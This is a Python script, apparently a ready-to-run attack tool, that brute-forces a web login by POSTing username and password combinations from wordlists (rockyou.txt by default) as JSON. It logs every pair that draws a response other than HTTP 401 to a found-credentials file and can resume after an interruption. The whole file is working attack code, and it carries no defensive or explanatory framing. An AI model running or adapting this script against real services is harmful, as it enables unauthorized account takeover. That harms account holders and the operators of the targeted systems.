import requests, sys, os, argparse
from tqdm import tqdm

parser = argparse.ArgumentParser(description="JSON POST brute-forcer")
parser.add_argument("--host",      default="http://interface",                  help="Base URL (default: http://interface)")
parser.add_argument("--path",      default="/login",                            help="Login path (default: /login)")
parser.add_argument("--users",     default="users.txt",                         help="Users wordlist (default: users.txt)")
parser.add_argument("--passwords", default="/usr/share/wordlists/rockyou.txt",  help="Password wordlist (default: rockyou.txt)")
args = parser.parse_args()

URL = args.host.rstrip("/") + args.path
PROGRESS_FILE = "brute-progress.txt"

users = open(args.users).read().splitlines()
passwords = open(args.passwords, errors="ignore").read().splitlines()

# Load resume point
start_ui, start_pi = 0, 0
if os.path.exists(PROGRESS_FILE):
    with open(PROGRESS_FILE) as f:
        line = f.read().strip()
    if line:
        start_ui, start_pi = map(int, line.split(":"))
        print(f"[*] Resuming from user {start_ui}, password {start_pi}")

print(f"[*] Target: {URL} | Users: {len(users)} | Passwords: {len(passwords)}")

total = len(users) * len(passwords)
completed = start_ui * len(passwords) + start_pi

cur_ui, cur_pi = start_ui, start_pi

def save_progress():
    with open(PROGRESS_FILE, "w") as f:
        f.write(f"{cur_ui}:{cur_pi}")

with open("found.txt", "a") as found_file:
    with tqdm(total=total, initial=completed, unit="attempt") as pbar:
        try:
            for ui in range(start_ui, len(users)):
                user = users[ui]
                pi_start = start_pi if ui == start_ui else 0
                for pi in range(pi_start, len(passwords)):
                    cur_ui, cur_pi = ui, pi
                    r = requests.post(URL,
                        json={"username": user, "password": passwords[pi]},
                        timeout=5)
                    if r.status_code != 401:
                        result = f"{user}:{passwords[pi]} -> HTTP {r.status_code}"
                        tqdm.write(f"[+] {result}")
                        found_file.write(result + "\n")
                        found_file.flush()
                    pbar.update(1)
        except KeyboardInterrupt:
            save_progress()
            tqdm.write(f"[*] Progress saved to {PROGRESS_FILE} (user {cur_ui}, password {cur_pi})")
            sys.exit(0)

os.remove(PROGRESS_FILE)
print("[*] Done.")
